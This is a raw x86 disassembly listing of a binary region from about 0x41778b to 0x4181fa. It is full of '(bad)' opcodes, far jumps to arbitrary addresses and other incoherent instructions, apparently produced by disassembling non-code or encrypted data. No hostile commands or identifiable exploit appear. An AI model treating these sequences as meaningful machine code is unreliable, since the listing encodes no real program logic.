  41778b:	aam    0x9
  41778d:	push   esp
  41778e:	popf   
  41778f:	dec    edi
	...
  4177f4:	jmp    0xff597607
  4177f9:	imul   ecx
  4177fb:	(bad)  
  4177fc:	lahf   
  4177fd:	repnz and dl,dl
  417800:	or     al,0x7f
  417802:	dec    eax
  417803:	repz je 0x4177fe
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	hlt    
  41780d:	or     BYTE PTR [ebx-0x7a6c73ea],dh
  417813:	jbe    0x4177d0
  417815:	mov    ch,0xd0
  417817:	lea    ebp,[edx]
  417819:	sub    DWORD PTR [eax],eax
  41781b:	imul   esp,DWORD PTR [esi+0x2a],0xffffffbe
  41781f:	mov    ch,0x9b
  417821:	loope  0x417823
  417823:	mov    ebp,es
  417825:	jmp    0x417827
  417827:	dec    BYTE PTR [edi-0xf6aa18a]
  41782d:	clc    
  41782e:	in     al,0x24
  417830:	call   0xb33b3ee9
  417835:	xlat   BYTE PTR ds:[ebx]
  417836:	ret    
  417837:	sub    DWORD PTR [eax-0x1667c1b6],ebp
  41783d:	sar    DWORD PTR [edi+0x70],0xf2
  417841:	dec    esi
  417842:	enter  0x2d38,0x40
  417846:	inc    eax
  417847:	xchg   ebp,eax
  417848:	aad    0x5d
  41784a:	pop    edx
  41784b:	outs   dx,BYTE PTR ds:[esi]
  41784c:	jmp    0x802a:0x362373eb
  417853:	int3   
  417854:	pop    edi
  417855:	mov    dh,0xa7
  417857:	dec    esp
  417858:	mov    WORD PTR [eax+0xf],ds
  41785b:	mov    ch,0x96
  41785d:	mov    edi,0xb6eea9f5
  417862:	fimul  WORD PTR [eax+ebx*4+0x1547a6a6]
  417869:	jp     0x41789a
  41786b:	cmp    al,0x87
  41786d:	add    DWORD PTR cs:[ecx],eax
  417870:	mov    DWORD PTR [edx-0x26edce60],edi
  417876:	inc    esi
  417877:	jle    0x41784a
  417879:	cmp    al,0xa6
  41787b:	mov    al,ds:0x68934a14
  417880:	scas   eax,DWORD PTR es:[edi]
  417881:	push   esi
  417882:	popa   
  417883:	sub    dh,BYTE PTR [ebx]
  417885:	xchg   edx,eax
  417886:	int    0x62
  417888:	call   0xad0c2336
  41788d:	xchg   ebp,eax
  41788e:	lahf   
  41788f:	or     DWORD PTR [ebp+0x43250e81],esp
  417895:	xchg   ecx,eax
  417896:	pop    edi
  417897:	cmp    DWORD PTR [ecx-0x1f864700],0xffffffe6
  41789e:	imul   edx,DWORD PTR ds:0x250bf1da,0x74a19376
  4178a8:	or     eax,0xfce67194
  4178ad:	sti    
  4178ae:	push   ecx
  4178af:	jmp    0xfa66583a
  4178b4:	dec    eax
  4178b5:	pop    eax
  4178b6:	xchg   ecx,eax
  4178b7:	push   0xffffffa6
  4178b9:	push   ecx
  4178ba:	xor    edx,DWORD PTR [esi-0x4c80e2f7]
  4178c0:	mov    edi,eax
  4178c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178c3:	pop    ss
  4178c4:	icebp  
  4178c5:	out    dx,eax
  4178c6:	imul   BYTE PTR [eax]
  4178c8:	mov    BYTE PTR fs:[edi-0x79],dl
  4178cc:	jne    0x4178fe
  4178ce:	xchg   ecx,eax
  4178cf:	inc    esp
  4178d0:	jge    0x41792e
  4178d2:	out    0x52,al
  4178d4:	sbb    al,BYTE PTR [edi-0x22]
  4178d7:	push   edi
  4178d8:	retf   
  4178d9:	push   ecx
  4178da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4178db:	daa    
  4178dc:	ret    0x4607
  4178df:	test   ebx,ebp
  4178e1:	adc    BYTE PTR [ebp+edx*4-0x46],al
  4178e5:	out    dx,eax
  4178e6:	mov    cl,0x89
  4178e8:	jo     0x4178ea
  4178ea:	xchg   esp,eax
  4178eb:	jge    0x417952
  4178ed:	mov    ah,0x64
  4178ef:	push   0x690ad1a5
  4178f4:	pop    ss
  4178f5:	das    
  4178f6:	mov    esi,0xbce566ee
  4178fb:	xor    bh,BYTE PTR gs:[edx-0x1e690d2d]
  417902:	cdq    
  417903:	gs mov dl,0xbf
  417906:	add    bh,BYTE PTR [ebx+0x64d96437]
  41790c:	push   cs
  41790d:	stos   BYTE PTR es:[edi],al
  41790e:	out    dx,eax
  41790f:	into   
	...
  417974:	pop    eax
  417975:	inc    ecx
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	jae    0x4179b3
  417982:	repz and DWORD PTR [eax-0x7],edi
  417986:	add    BYTE PTR [eax],al
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	lods   eax,DWORD PTR ds:[esi]
  41798d:	(bad)  
  41798e:	out    dx,eax
  41798f:	mov    dh,0x15
  417991:	nop
  417992:	or     cl,BYTE PTR [ecx-0x379202f]
  417998:	jg     0x4179f7
  41799a:	repz jecxz 0x41797f
  41799d:	clc    
  41799e:	push   edx
  41799f:	push   ebp
  4179a0:	sub    BYTE PTR [edi],dh
  4179a2:	sub    ebp,esi
  4179a4:	or     DWORD PTR [edi-0x62b5538c],ebp
  4179aa:	push   es
  4179ab:	xchg   ebx,eax
  4179ac:	pop    edi
  4179ad:	js     0x41794a
  4179af:	jmp    0x4179a3
  4179b1:	inc    eax
  4179b2:	cmp    ebp,DWORD PTR [esi+ebx*1+0x15c93514]
  4179b9:	or     dh,BYTE PTR [esi]
  4179bb:	test   ebp,esi
  4179bd:	pusha  
  4179be:	dec    esp
  4179bf:	push   cs
  4179c0:	add    BYTE PTR [ebx-0x6967ba20],cl
  4179c6:	cmp    eax,0xd93cbc1c
  4179cb:	jno    0x4179b3
  4179cd:	in     eax,dx
  4179ce:	in     eax,0xc3
  4179d0:	mov    ecx,0xa79229dd
  4179d5:	mov    edx,0x594f348e
  4179da:	cs push esi
  4179dc:	out    dx,al
  4179dd:	sbb    DWORD PTR [ecx+0x1f],edx
  4179e0:	popf   
  4179e1:	or     BYTE PTR [ecx],bh
  4179e3:	xor    BYTE PTR [ebp+edx*1+0x1e],bl
  4179e7:	xchg   edi,eax
  4179e8:	stos   BYTE PTR es:[edi],al
  4179e9:	addr16 dec edx
  4179eb:	iret   
  4179ec:	push   cs
  4179ed:	or     edi,ebx
  4179ef:	mov    ecx,0x2161aa38
  4179f4:	mov    WORD PTR [ecx+ecx*1-0x31193b98],?
  4179fb:	mov    edx,0x7dacf67d
  417a00:	push   es
  417a01:	out    dx,al
  417a02:	mov    BYTE PTR [ebp-0x3f],bl
  417a05:	data16 adc BYTE PTR [edi],cl
  417a08:	sub    ch,BYTE PTR [ebx+edx*1+0x0]
  417a0c:	sahf   
  417a0d:	shr    BYTE PTR [esi+0x11],0x56
  417a11:	xor    ecx,esi
  417a13:	sbb    esi,esi
  417a15:	aam    0xb3
  417a17:	test   DWORD PTR [edi],edi
  417a19:	out    dx,al
  417a1a:	fimul  WORD PTR [edx]
  417a1c:	pop    esp
  417a1d:	mov    al,0xd5
  417a1f:	bound  ebx,QWORD PTR gs:[edi+0x3c7cf21a]
  417a26:	add    al,BYTE PTR [edi]
  417a28:	pop    ss
  417a29:	imul   ecx,edi,0x739c80e6
  417a2f:	adc    edi,0x27
  417a32:	pop    esi
  417a33:	xchg   esi,eax
  417a34:	push   esp
  417a35:	add    DWORD PTR [ebx+0x4a9c7b19],eax
  417a3b:	xchg   ebp,eax
  417a3c:	inc    BYTE PTR [eax-0x4a719059]
  417a42:	add    BYTE PTR [edi+0x6438459b],cl
  417a48:	pop    DWORD PTR [ecx-0x2b]
  417a4b:	cmp    edi,DWORD PTR [esi+0x5]
  417a4e:	je     0x417a5f
  417a50:	into   
  417a51:	fidivr WORD PTR [ecx]
  417a53:	jle    0x417a1d
  417a55:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417a56:	std    
  417a57:	ja     0x4179e0
  417a59:	stos   BYTE PTR es:[edi],al
  417a5a:	mul    BYTE PTR [edi+0x41423655]
  417a60:	push   edi
  417a61:	stc    
  417a62:	jne    0x4179e5
  417a64:	and    al,al
  417a66:	jae    0x417a6e
  417a68:	add    al,0x89
  417a6a:	test   al,0x57
  417a6c:	jmp    0x472e0d10
  417a71:	call   0xc180813e
  417a76:	mov    WORD PTR [edi+0x75],ds
  417a79:	mov    al,ds:0xbe3d900e
  417a7e:	mov    edx,0xa8ecf4bc
  417a83:	(bad)  
  417a84:	mov    ecx,0xa2b568e3
  417a89:	sub    DWORD PTR [ecx-0x2366af0b],ecx
  417a8f:	jae    0x417a91
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx-0x79176a7a]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	and    al,0x67
  417b0e:	mov    esi,0x32e9e542
  417b13:	iret   
  417b14:	and    bh,BYTE PTR [esi+ecx*2-0x1b]
  417b18:	inc    esp
  417b19:	dec    bl
  417b1b:	dec    ebp
  417b1c:	cli    
  417b1d:	mov    eax,0xfca560b8
  417b22:	ins    DWORD PTR es:[edi],dx
  417b23:	outs   dx,BYTE PTR ds:[esi]
  417b24:	into   
  417b25:	test   al,0xbe
  417b27:	mov    dh,dh
  417b29:	sbb    DWORD PTR [ecx],ebp
  417b2b:	adc    al,0x69
  417b2d:	pop    edi
  417b2e:	jle    0x417aea
  417b30:	jo     0x417ab4
  417b32:	loop   0x417b3c
  417b34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b35:	jo     0x417aff
  417b37:	jns    0x417b07
  417b39:	cli    
  417b3a:	jecxz  0x417b14
  417b3c:	cmp    eax,eax
  417b3e:	ins    BYTE PTR es:[edi],dx
  417b3f:	ja     0x417b4d
  417b41:	shl    BYTE PTR ds:[edi],0x6f
  417b45:	adc    bh,cl
  417b47:	(bad)  
  417b48:	mov    al,0x67
  417b4a:	push   esi
  417b4b:	fcom   DWORD PTR [edx]
  417b4d:	inc    ebx
  417b4e:	adc    dl,BYTE PTR [edi-0x43c2d482]
  417b54:	mov    edi,0x8cad25ae
  417b59:	out    0x49,al
  417b5b:	xor    al,0x74
  417b5d:	(bad)  
  417b5e:	(bad)  
  417b5f:	loope  0x417bba
  417b61:	sub    BYTE PTR [edx],bl
  417b63:	jp     0x417bc3
  417b65:	mov    al,0xaa
  417b67:	mov    edx,0xe79ef15d
  417b6c:	fst    st(2)
  417b6e:	sub    eax,0xbb5a081d
  417b73:	dec    esp
  417b74:	mov    esp,0xea12e524
  417b79:	mov    edi,0x68d7d427
  417b7e:	(bad)  
  417b7f:	in     al,dx
  417b80:	or     eax,0x76e1c6f
  417b85:	adc    ecx,eax
  417b87:	lock and BYTE PTR [ebx+ebx*8-0x47],0xf
  417b8d:	mov    ebx,0xe58acc51
  417b92:	(bad)  
  417b93:	mov    ebx,0x200f5a47
  417b98:	mov    BYTE PTR [ebp+0x1b],bh
  417b9b:	out    dx,eax
  417b9c:	fidivr WORD PTR ss:[ebp-0x712e2e1d]
  417ba3:	aad    0x50
  417ba5:	cdq    
  417ba6:	faddp  st(4),st
  417ba9:	xor    ebx,DWORD PTR [esi-0x34]
  417bac:	sbb    esi,edx
  417bae:	lds    esi,FWORD PTR [esp+ebp*4]
  417bb1:	mov    bh,0x6b
  417bb3:	inc    eax
  417bb4:	popf   
  417bb5:	pop    eax
  417bb6:	xlat   BYTE PTR ds:[ebx]
  417bb7:	out    0xb1,eax
  417bb9:	or     ecx,DWORD PTR [ecx+ebx*8]
  417bbc:	jmp    0xe4ec:0xcf0edb3c
  417bc3:	xor    al,0x10
  417bc5:	and    bh,BYTE PTR [ebp-0x50]
  417bc8:	test   al,0x7c
  417bca:	cdq    
  417bcb:	cmp    bh,BYTE PTR [esi+0x63]
  417bce:	scas   al,BYTE PTR es:[edi]
  417bcf:	shr    BYTE PTR [edi+0x52],cl
  417bd2:	or     esi,DWORD PTR es:[ecx]
  417bd5:	sub    eax,0x9091d8b2
  417bda:	push   esi
  417bdb:	sahf   
  417bdc:	es inc esi
  417bde:	pop    ecx
  417bdf:	xchg   esi,eax
  417be0:	enter  0xa952,0xbf
  417be4:	add    eax,0xf829438b
  417be9:	iret   
  417bea:	jns    0x417b74
  417bec:	clc    
  417bed:	mov    dl,0x2c
  417bef:	or     BYTE PTR [ebp-0x4bccded7],bh
  417bf5:	mov    ebx,0x123188c7
  417bfa:	call   0x41efcbfd
  417bff:	mov    WORD PTR [ecx],gs
  417c01:	sbb    eax,0x8fe460df
  417c06:	xchg   edi,eax
  417c07:	lock dec esp
  417c09:	mov    edi,esi
  417c0b:	out    dx,al
  417c0c:	dec    ebp
  417c0d:	in     al,0x9f
  417c0f:	popa   
	...
  417c74:	mov    eax,eax
  417c76:	nop
  417c77:	test   cl,bl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0x29
  417c81:	fstp   QWORD PTR [ecx]
  417c83:	test   eax,0xfb80
  417c88:	add    al,0x1
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	mov    eax,ds:0xac8b866d
  417c91:	push   ds
  417c92:	bound  eax,QWORD PTR ds:0xfb9ddcc
  417c98:	or     eax,0xe444dcc7
  417c9d:	sti    
  417c9e:	jmp    0xcd5e1a50
  417ca3:	dec    esp
  417ca4:	test   al,0x5b
  417ca6:	adc    DWORD PTR [ebp-0x3d8de3f0],ebx
  417cac:	retf   
  417cad:	test   al,0x7d
  417caf:	arpl   WORD PTR [ebx+0x5],cx
  417cb2:	add    eax,0x86bee922
  417cb7:	rcr    cl,cl
  417cb9:	cmp    BYTE PTR [edx],cl
  417cbb:	cmp    al,0x1e
  417cbd:	and    BYTE PTR [edi],0x26
  417cc0:	jne    0x417c7f
  417cc2:	in     eax,0x8f
  417cc4:	mov    edx,0x34a3a8d4
  417cc9:	inc    BYTE PTR [ecx*1+0x5fa9f366]
  417cd0:	ficom  WORD PTR [esi-0x12]
  417cd3:	jg     0x417d24
  417cd5:	xor    BYTE PTR [esi-0x16],dl
  417cd8:	stos   BYTE PTR es:[edi],al
  417cd9:	(bad)  
  417cda:	or     eax,0x71c3cbc1
  417cdf:	cmp    cl,bl
  417ce1:	repz (bad) 
  417ce3:	in     eax,0x4b
  417ce5:	lahf   
  417ce6:	scas   al,BYTE PTR es:[edi]
  417ce7:	sub    dl,al
  417ce9:	adc    bh,BYTE PTR [ebx+0x6f]
  417cec:	xchg   esi,eax
  417ced:	(bad)  
  417cee:	in     al,dx
  417cef:	repz mov edx,0x610750bd
  417cf5:	test   BYTE PTR [ebp+0x12],ch
  417cf8:	test   eax,0xc399efe6
  417cfd:	neg    DWORD PTR [esi+0x61efec8d]
  417d03:	inc    ebx
  417d04:	jnp    0x417d29
  417d06:	loop   0x417c99
  417d08:	push   esi
  417d09:	add    dl,BYTE PTR [ebx-0x3]
  417d0c:	and    al,0xfd
  417d0e:	mov    ecx,0x5c7a96db
  417d13:	mov    dh,0xa0
  417d15:	dec    esi
  417d16:	dec    esi
  417d17:	les    edx,FWORD PTR [esi+ebp*8+0x72abc9eb]
  417d1e:	retf   
  417d1f:	rcr    BYTE PTR [ebp+0x24e29d23],0xd6
  417d26:	js     0x417cf0
  417d28:	mov    dl,0xa4
  417d2a:	cmp    DWORD PTR [edx+eax*4+0x56922731],0x5342f31d
  417d35:	pop    eax
  417d36:	push   0x77281422
  417d3b:	push   es
  417d3c:	mov    ds:0x9b45c5a9,eax
  417d41:	cmp    esp,DWORD PTR [ebx-0x64]
  417d44:	stc    
  417d45:	inc    esi
  417d46:	add    BYTE PTR [esp+edi*8-0x69065759],ah
  417d4d:	xor    eax,0xa5b6028d
  417d52:	enter  0xce4c,0xbf
  417d56:	cmc    
  417d57:	not    DWORD PTR [eax+0x61]
  417d5a:	jg     0x417cec
  417d5c:	loop   0x417ddd
  417d5e:	int    0xc4
  417d60:	jne    0x417d6e
  417d62:	xor    eax,0x58e4046a
  417d67:	cld    
  417d68:	aaa    
  417d69:	push   ebx
  417d6a:	mov    eax,0x67a01d18
  417d6f:	jo     0x417d5e
  417d71:	xor    edi,DWORD PTR [edx]
  417d73:	mov    dl,0x95
  417d75:	push   ecx
  417d76:	mov    dh,0xfd
  417d78:	jmp    0x7f6f:0xc51e9018
  417d7f:	jb     0x417d89
  417d81:	fnsave [ebp-0x3b]
  417d84:	or     BYTE PTR [ebp+0x363ebde1],al
  417d8a:	and    DWORD PTR [ebx+0x51b84064],esp
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	call   FWORD PTR [edx-0x37ba3f5]
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	fcmovnbe st,st(3)
  417e0e:	out    0xd7,al
  417e10:	pop    ds
  417e11:	jle    0x417dda
  417e13:	sahf   
  417e14:	add    esi,DWORD PTR [edx+0x2a]
  417e17:	in     eax,dx
  417e18:	lods   al,BYTE PTR ds:[esi]
  417e19:	outs   dx,BYTE PTR ds:[esi]
  417e1a:	aaa    
  417e1b:	fistp  WORD PTR [edi+0x439fc1b9]
  417e21:	in     eax,dx
  417e22:	mov    ds:0xac449124,eax
  417e27:	mov    ah,0x1
  417e29:	push   esi
  417e2a:	(bad)  
  417e2c:	getsec 
  417e2e:	mov    DWORD PTR [esi-0x9],eax
  417e31:	and    eax,0x88d58b2
  417e36:	mov    ecx,0x317d509
  417e3b:	(bad)  
  417e3c:	leave  
  417e3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417e3e:	push   0xce407cac
  417e43:	jecxz  0x417e89
  417e45:	and    DWORD PTR gs:[edx],ecx
  417e48:	jl     0x417e4a
  417e4a:	ror    cl,1
  417e4c:	rcr    BYTE PTR [esi],cl
  417e4e:	fbld   TBYTE PTR [ebp+0x4a]
  417e51:	pop    eax
  417e52:	ret    0x9286
  417e55:	push   ds
  417e56:	test   BYTE PTR [edx-0x67],bl
  417e59:	dec    ebp
  417e5a:	(bad)  [ecx+0x4cae843c]
  417e60:	xor    dl,ch
  417e62:	push   cs
  417e63:	imul   edx,DWORD PTR [ebp+eiz*1-0x3c],0xddebdb85
  417e6b:	dec    edi
  417e6c:	enter  0xd53d,0x4
  417e70:	scas   al,BYTE PTR es:[edi]
  417e71:	ret    
  417e72:	out    dx,eax
  417e73:	stc    
  417e74:	jb     0x417ea3
  417e76:	data16 add al,0xa6
  417e79:	loope  0x417ef4
  417e7b:	fistp  QWORD PTR [edi]
  417e7d:	xchg   edi,eax
  417e7e:	mov    ss,WORD PTR [eax-0x35]
  417e81:	daa    
  417e82:	js     0x417eba
  417e84:	das    
  417e85:	cmp    BYTE PTR [edi+0x11d6e9eb],bl
  417e8b:	mov    ss,WORD PTR [edi-0x370b3350]
  417e91:	outs   dx,BYTE PTR ds:[esi]
  417e92:	cmp    bh,ch
  417e94:	jecxz  0x417e75
  417e96:	pusha  
  417e97:	and    eax,0xebde6ad0
  417e9c:	int    0x6f
  417e9e:	cmovge esp,esi
  417ea1:	js     0x417ef3
  417ea3:	dec    esi
  417ea4:	fimul  DWORD PTR [esi*2+0x595f9735]
  417eab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417eac:	adc    eax,0xb401be1
  417eb1:	pop    ecx
  417eb2:	sbb    eax,0x867b0a34
  417eb7:	jge    0x417f07
  417eb9:	xchg   ecx,eax
  417eba:	mov    BYTE PTR [ecx+0x1d1e4b45],cl
  417ec0:	pcmpeqb mm2,QWORD PTR [edx]
  417ec3:	sub    al,0x57
  417ec5:	sbb    al,0xe8
  417ec7:	cmp    al,0x75
  417ec9:	stc    
  417eca:	dec    edi
  417ecb:	popa   
  417ecc:	inc    ebx
  417ecd:	aad    0x62
  417ecf:	in     eax,0xf2
  417ed1:	pusha  
  417ed2:	xor    cl,bl
  417ed4:	sbb    eax,0x497efbb0
  417ed9:	jne    0x417f30
  417edb:	push   cs
  417edc:	or     DWORD PTR [ecx+0x1f],eax
  417edf:	push   edx
  417ee0:	add    al,BYTE PTR [esi+0x4f2d1bad]
  417ee6:	fs retf 0xae75
  417eea:	ja     0x417e94
  417eec:	add    eax,0x7d963717
  417ef1:	adc    esi,DWORD PTR [eax+ebx*2+0x2a]
  417ef5:	stos   BYTE PTR es:[edi],al
  417ef6:	mov    edi,0x374c41e6
  417efb:	mov    al,0x24
  417efd:	add    ebx,DWORD PTR fs:[edx]
  417f00:	ret    0xaaac
  417f03:	sar    DWORD PTR [esi-0x5e5d1810],cl
  417f09:	inc    ebx
  417f0a:	cmp    eax,0xa254fa03
  417f0f:	sub    eax,DWORD PTR [eax]
	...
  417f71:	add    BYTE PTR [eax],al
  417f73:	add    BYTE PTR [edx-0x1a],ah
  417f76:	out    0x3b,al
  417f78:	out    0x3b,al
  417f7a:	(bad)  
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	je     0x417f52
  417f82:	ror    DWORD PTR fs:[eax+0x40000fd],cl
  417f89:	add    DWORD PTR [eax],eax
  417f8b:	add    BYTE PTR [esi],bl
  417f8d:	aaa    
  417f8e:	mov    esi,0x97d06b80
  417f93:	sbb    cl,bh
  417f95:	jl     0x417f6b
  417f97:	add    al,0x27
  417f99:	sbb    BYTE PTR [ebx],cl
  417f9b:	dec    ebp
  417f9c:	ja     0x417fae
  417f9e:	mov    cl,BYTE PTR [edi+0x21ee8e46]
  417fa4:	xchg   esp,eax
  417fa5:	jb     0x417f8c
  417fa7:	mov    esi,0x71e9d93d
  417fac:	ret    
  417fad:	cdq    
  417fae:	push   0x7a5aae44
  417fb3:	(bad)
  417fb7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fb8:	scas   al,BYTE PTR es:[edi]
  417fb9:	inc    ebx
  417fba:	(bad)  
  417fbb:	mov    DWORD PTR [esp+edx*2],ebx
  417fbe:	dec    ebp
  417fbf:	jmp    0x1675b475
  417fc4:	aad    0xeb
  417fc6:	in     al,dx
  417fc7:	mov    ds:0xc2995cb2,eax
  417fcc:	inc    esi
  417fcd:	xor    ch,BYTE PTR [edi+0x1f]
  417fd0:	adc    BYTE PTR [eax],bh
  417fd2:	jmp    0xaff97386
  417fd7:	mov    WORD PTR [ecx+0x36],?
  417fda:	test   BYTE PTR ds:0x864a9ecb,0xd2
  417fe1:	js     0x418031
  417fe3:	sub    bl,BYTE PTR [esi]
  417fe5:	mov    dh,0xfe
  417fe7:	add    cl,BYTE PTR [edx]
  417fe9:	int3   
  417fea:	sub    bl,BYTE PTR [ebx+eiz*1-0x76]
  417fee:	sar    edi,0xff
  417ff1:	sar    DWORD PTR [ecx+0x1cdd1733],1
  417ff7:	push   esi
  417ff8:	cmp    DWORD PTR [esi],0xffffff84
  417ffb:	into   
  417ffc:	pop    es
  417ffd:	dec    edx
  417ffe:	xchg   dl,cl
  418000:	push   esp
  418001:	push   esp
  418002:	and    ch,ch
  418004:	sahf   
  418005:	jg     0x41805e
  418007:	into   
  418008:	pop    eax
  418009:	cmp    eax,0x832ef1a7
  41800e:	push   ebp
  41800f:	les    ebp,FWORD PTR [esi]
  418011:	shl    ebp,1
  418013:	xchg   ebx,eax
  418014:	xchg   DWORD PTR [ecx],eax
  418016:	xchg   BYTE PTR [ecx],ah
  418018:	outs   dx,DWORD PTR ds:[esi]
  418019:	lods   eax,DWORD PTR ds:[esi]
  41801a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41801c:	jge    0x41803d
  41801e:	xchg   ecx,eax
  41801f:	mul    BYTE PTR [edi]
  418021:	and    bl,cl
  418023:	mov    esi,0x76f62d7c
  418028:	stos   DWORD PTR es:[edi],eax
  418029:	je     0x418095
  41802b:	mov    edi,0x5e93d04d
  418030:	ds add eax,0xe8109f72
  418036:	jb     0x41801c
  418038:	xchg   esp,eax
  418039:	(bad)  
  41803a:	pop    esi
  41803b:	lea    esi,[eax]
  41803d:	xor    BYTE PTR [ecx],ch
  41803f:	push   edi
  418040:	mov    dl,0x79
  418042:	in     al,dx
  418043:	out    0xd2,al
  418045:	push   eax
  418046:	popa   
  418047:	push   edi
  418048:	std    
  418049:	mov    ebx,0x8c48f84f
  41804e:	xlat   BYTE PTR ds:[ebx]
  41804f:	push   cs
  418050:	cmp    edx,esi
  418052:	shl    BYTE PTR [ebp-0x1921175d],cl
  418058:	sbb    al,0xbb
  41805a:	js     0x418042
  41805c:	push   esp
  41805d:	call   0x3ae5:0x66e70905
  418064:	and    al,BYTE PTR [edx-0x1e]
  418067:	aad    0x93
  418069:	outs   dx,DWORD PTR ds:[esi]
  41806a:	push   es
  41806b:	jge    0x41807e
  41806d:	repnz frstor [ecx+0x30]
  418071:	push   0x6070071a
  418076:	jae    0x418029
  418078:	or     eax,0x433c431d
  41807d:	adc    al,0x2a
  41807f:	aas    
  418080:	xchg   esp,eax
  418081:	sub    al,0xa8
  418083:	sbb    al,0x73
  418085:	sbb    DWORD PTR [ecx-0x78],esp
  418088:	or     eax,0x88b03fa9
  41808d:	dec    edx
  41808e:	shr    al,0x0
	...
  4180f1:	add    BYTE PTR [eax],al
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0xd92fdebc,eax
  418101:	icebp  
  418102:	out    0x8c,eax
  418104:	mov    esi,?
  418106:	add    BYTE PTR [eax],al
  418108:	add    al,0x1
  41810a:	add    BYTE PTR [eax],al
  41810c:	sub    edi,esi
  41810e:	push   ds
  41810f:	mov    bh,0xba
  418111:	(bad)  
  418112:	fidiv  WORD PTR [eax-0x6d461aa5]
  418118:	mov    al,0x9c
  41811a:	pop    ds
  41811b:	outs   dx,BYTE PTR ds:[esi]
  41811c:	arpl   WORD PTR [ecx-0x15edd469],bx
  418122:	mov    dh,0x11
  418124:	inc    ebx
  418125:	xlat   BYTE PTR ds:[ebx]
  418126:	popa   
  418127:	adc    cl,BYTE PTR [edx+0x60]
  41812a:	imul   ecx,DWORD PTR [edi],0x33
  41812d:	fdivr  DWORD PTR [ecx+0x2d]
  418130:	aas    
  418131:	in     al,dx
  418132:	les    ecx,FWORD PTR [edi]
  418134:	lahf   
  418135:	add    DWORD PTR [eax],esp
  418137:	xlat   BYTE PTR ds:[ebx]
  418138:	ret    0x893
  41813b:	or     al,0x64
  41813d:	cmp    al,BYTE PTR [eax]
  41813f:	pop    ecx
  418140:	loope  0x418152
  418142:	jmp    0x9c7e1828
  418147:	add    al,0x36
  418149:	pop    esp
  41814a:	rol    BYTE PTR [esi-0x76],cl
  41814d:	ins    DWORD PTR es:[edi],dx
  41814e:	sub    eax,0xc07f5f75
  418153:	cmp    dl,BYTE PTR [edx-0x39607c8c]
  418159:	sbb    esp,DWORD PTR [edi-0x43]
  41815c:	add    eax,0x92d00d36
  418161:	call   0x370b437c
  418166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418167:	hlt    
  418168:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418169:	outs   dx,BYTE PTR ds:[esi]
  41816a:	dec    esp
  41816b:	mov    esi,0xf3b351df
  418170:	popf   
  418171:	cli    
  418172:	loope  0x41819f
  418174:	icebp  
  418175:	pop    ecx
  418176:	xor    BYTE PTR [esi-0x4b],dh
  418179:	push   edx
  41817a:	rcl    BYTE PTR [ebx+0x1b],1
  41817d:	or     DWORD PTR [edi+0x17ea5392],ecx
  418183:	xchg   ecx,ebp
  418185:	pop    eax
  418186:	nop
  418187:	aaa    
  418188:	adc    DWORD PTR [edx-0x2],ebx
  41818b:	jecxz  0x4181f1
  41818d:	push   edi
  41818e:	shl    DWORD PTR es:[edi+edi*4+0x7ff02e87],0xb1
  418197:	jo     0x41815f
  418199:	fmul   DWORD PTR [ebx+0x623564ad]
  41819f:	mov    edi,0x25b1de40
  4181a4:	pop    ebp
  4181a5:	add    BYTE PTR [edx+ecx*1+0x6f59597d],al
  4181ac:	pinsrw mm5,esp,0xea
  4181b0:	lea    edi,[ebx-0x75391997]
  4181b6:	jbe    0x4181d9
  4181b8:	les    ebp,FWORD PTR [edx]
  4181ba:	aad    0xac
  4181bc:	shl    edi,cl
  4181be:	inc    eax
  4181bf:	je     0x4181ec
  4181c1:	add    ah,BYTE PTR [ebp-0x17f7462c]
  4181c7:	sbb    ebx,DWORD PTR ds:0x8a70dad8
  4181cd:	outs   dx,DWORD PTR ds:[esi]
  4181ce:	(bad)  
  4181cf:	xor    eax,0x9ee48f78
  4181d4:	icebp  
  4181d5:	pusha  
  4181d6:	mov    ?,WORD PTR [ecx-0x80]
  4181d9:	fidiv  DWORD PTR [ecx+ebp*4-0xd]
  4181dd:	mov    ebx,0xe2330e12
  4181e2:	cmp    eax,0xcf0d316a
  4181e7:	in     eax,dx
  4181e8:	mov    esp,0xb151759
  4181ed:	fdiv   st,st(0)
  4181ef:	mov    bl,0xeb
  4181f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4181f2:	dec    edx
  4181f3:	cmp    eax,0x86f23cbc
  4181f8:	jp     0x418233
  4181fa:	hlt    
